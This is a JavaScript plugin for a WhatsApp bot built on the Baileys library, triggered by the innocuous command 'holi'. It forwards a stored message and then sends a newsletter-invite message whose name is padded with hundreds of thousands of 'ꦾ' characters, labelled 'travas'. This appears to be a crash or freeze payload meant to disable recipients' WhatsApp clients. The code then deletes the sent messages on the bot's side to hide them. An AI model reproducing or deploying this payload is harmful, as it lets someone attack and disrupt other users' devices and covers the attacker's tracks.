import fs from 'fs';
import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

const FILE_PATH = './mensajes_guardados.json';

let handler = async (m, { conn }) => {
  try {
    // 1. No permitir en grupos
    if (m.isGroup) return m.reply('❌ Este comando no puede usarse en grupos.');

    // 2. Solo el número del bot puede usarlo
    const botNumber = conn.user?.jid || '';
    if (m.sender !== botNumber) {
      return m.reply('❌ Solo el número vinculado al bot puede usar este comando.');
    }

    // 3. Verificar mensaje guardado
    if (!fs.existsSync(FILE_PATH)) return m.reply('❌ No hay mensaje guardado.');
    const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
    if (!mensaje?.message) return m.reply('❌ El archivo está dañado o incompleto.');

    // 4. Enviar mensaje del archivo
    const enviado1 = await conn.copyNForward(m.chat, mensaje, true);

    // 5. Eliminarlo localmente para el bot (forma recomendada)
    await conn.sendMessage(conn.user.id, { delete: enviado1.key });

    // 6. Generar mensaje tipo canal
    const travas = 'ꦾ'.repeat(90000);
    const canalMessage = {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363282786345717@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas + travas + travas,
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    };

    const generado = await generateWAMessageFromContent(m.chat, canalMessage, {
      userJid: conn.user.id,
    });

    const enviado2 = await conn.relayMessage(m.chat, generado.message, {
      messageId: generado.key.id
    });

    // 7. Eliminar también ese mensaje localmente para el bot
    await conn.sendMessage(conn.user.id, { delete: generado.key });

    // 8. Confirmación
    await conn.sendMessage(m.chat, {
      text: '😼 Enviado con éxito.',
    }, { quoted: m });

  } catch (e) {
    console.error('[ERROR enviarmsg]:', e);
    return m.reply('❌ Error:\n' + (e.message || e));
  }
};

handler.command = ['holi'];
export default handler;